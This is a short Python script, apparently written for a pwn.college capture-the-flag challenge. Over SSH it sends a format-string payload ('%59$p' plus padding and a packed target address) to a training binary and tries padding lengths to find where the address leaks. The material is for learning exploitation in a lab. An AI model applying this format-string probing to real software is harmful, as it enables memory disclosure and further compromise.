import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = b"|%59$p"

for pad in range(16):
    payload = fmt + b"A" * pad + struct.pack("<Q", ADDR)
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    line = next((l for l in out.splitlines() if l.startswith("AAA ")), "")
    value = line.split("|")[-1].strip() if line else ""
    print(f"pad {pad}: {value}")
